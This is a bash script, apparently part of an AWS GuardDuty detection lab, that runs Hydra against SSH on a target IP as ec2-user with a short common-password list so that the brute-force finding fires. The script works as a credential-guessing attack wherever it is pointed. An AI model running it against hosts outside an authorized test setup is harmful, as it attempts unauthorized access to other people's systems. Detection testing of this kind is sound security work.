#!/bin/bash
# simulation/ssh_bruteforce.sh
#
# Triggers: UnauthorizedAccess:EC2/SSHBruteForce
#
# Run this FROM the attacker EC2 instance after SSHing in.
# GuardDuty monitors VPC Flow Logs and detects the repeated
# failed SSH attempts from the attacker IP to the target.
#
# Usage:
#   chmod +x ssh_bruteforce.sh
#   ./ssh_bruteforce.sh <TARGET_PRIVATE_IP>
#
# Note: GuardDuty may take 5-15 minutes to surface the finding
# after the traffic pattern is detected in Flow Logs.

set -euo pipefail

TARGET_IP="${1:?Usage: ./ssh_bruteforce.sh <target-private-ip>}"
WORDLIST="/tmp/passwords.txt"

echo "[*] Generating password wordlist..."
cat > "$WORDLIST" <<EOF
password
123456
admin
root
letmein
welcome
monkey
dragon
master
qwerty
EOF

echo "[*] Starting SSH brute force against $TARGET_IP"
echo "[*] GuardDuty will detect this pattern in VPC Flow Logs"
echo "[*] Expected finding: UnauthorizedAccess:EC2/SSHBruteForce"
echo ""

# Hydra SSH brute force — intentionally fails (wrong passwords)
# The failed connection pattern is what GuardDuty detects
hydra \
  -l ec2-user \
  -P "$WORDLIST" \
  -t 4 \
  -vV \
  ssh://"$TARGET_IP" || true

echo ""
echo "[*] Brute force simulation complete"
echo "[*] Check GuardDuty findings in 5-15 minutes"
echo "[*] Or generate a sample finding immediately:"
echo "    aws guardduty create-sample-findings \\"
echo "      --detector-id <DETECTOR_ID> \\"
echo "      --finding-types 'UnauthorizedAccess:EC2/SSHBruteForce'"
